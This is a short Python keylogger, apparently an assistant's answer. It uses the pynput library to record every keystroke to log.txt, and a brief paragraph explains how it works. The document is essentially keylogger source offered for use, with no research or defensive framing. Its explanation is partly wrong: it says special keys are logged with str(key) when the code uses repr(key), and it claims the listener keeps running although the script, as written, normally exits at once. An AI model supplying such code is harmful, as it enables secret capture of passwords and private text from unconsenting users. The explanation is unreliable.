```python
from pynput import keyboard

# Function to write keystrokes to the log file
def on_press(key):
    try:
        # Use key.char for letters and numbers
        char = key.char
    except AttributeError:
        # Use str(key) for special keys
        char = repr(key)
    
    with open('log.txt', 'a') as log_file:
        log_file.write(f'{char}\n')

# Create a listener with on_press callback
listener = keyboard.Listener(on_press=on_press)

# Start the listener (this will keep running until manually stopped)
listener.start()
```

This code uses the `pynput` library to create a keylogger that captures keystrokes, writes them to a file named `log.txt`, and differentiates between letters/numbers using `key.char` and special keys using `str(key)`. The listener will continue running until manually stopped due to the call to `listener.start()`.